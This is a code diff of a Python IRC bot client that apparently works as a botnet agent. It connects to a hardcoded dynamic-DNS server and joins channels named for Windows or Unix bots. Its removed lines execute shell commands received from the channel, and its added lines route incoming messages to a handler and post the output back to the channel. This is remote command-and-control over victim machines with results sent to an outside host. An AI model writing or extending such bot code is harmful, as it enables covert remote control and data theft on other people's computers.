@@ -1,13 +1,13 @@
 import socket, os
 import subprocess
 import irc
-import execute
+import router
 
 #SETTINGS:
 if  os.name=="nt":
-	settings_channel = "#winbots"
+	os_type = "#winbots"
 else:
-	settings_channel = "#unixbots"
+	os_type = "#unixbots"
 	
 settings_server = "jpdias.noip.me"
 settings_port = 1723
@@ -16,7 +16,7 @@ settings_botpass = "password"
 settings_owner = "root"
 settings_commandprefix = "!"
 
-ircSession = irc.connect(settings_server,settings_port,settings_botnick,settings_botpass,settings_channel,settings_owner);
+ircSession = irc.connect(settings_server,settings_port,settings_botnick,settings_botpass,os_type,settings_owner);
 
 while True:
 	recvText = ircSession.recv(2048) #Text read from the server
@@ -34,8 +34,9 @@ while True:
 			#print "messageSender:", messageSender, "messageChannel:", messageChannel, "messageSent:", messageSent
 			if messageSent[0] == settings_commandprefix:
 				ircSession.ParseUserCommands(ircSession, messageSender, messageChannel, messageSent)
-			if messageSent.find ( 'cmd' ) != -1:
-				execute.ExecCmd(messageSent.split(':')[1])
+			else:
+				output = router.distribute(messageSent)
+				ircSession.send ( 'PRIVMSG ' + messageChannel + ' :'+ output +'\r\n' )
 		if parseText[0] == "PING":
 			#Respond to PINGs
 			pingSender = parseText[1].split(":")[1]
